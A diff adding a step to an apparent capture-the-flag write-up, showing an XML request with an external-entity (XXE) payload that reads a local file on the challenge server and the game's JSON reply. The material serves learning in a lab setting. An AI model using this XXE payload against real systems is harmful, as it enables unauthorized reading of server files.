@@ -316,3 +316,22 @@ Accept-Encoding: gzip, deflate
   "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
 }
 ```
+- Let's visit the image. We got the name of the next file (*goldring_to_be_deleted.txt*).
+- goldring_to_be_deleted.txt (Request):
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt"> ]>
+<root>
+  <imgDrop>&xxe;</imgDrop>
+  <who>princess</who>
+  <reqType>xml</reqType>
+</root>
+```
+- goldring_to_be_deleted.txt (Response):
+```json
+{
+  "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+```
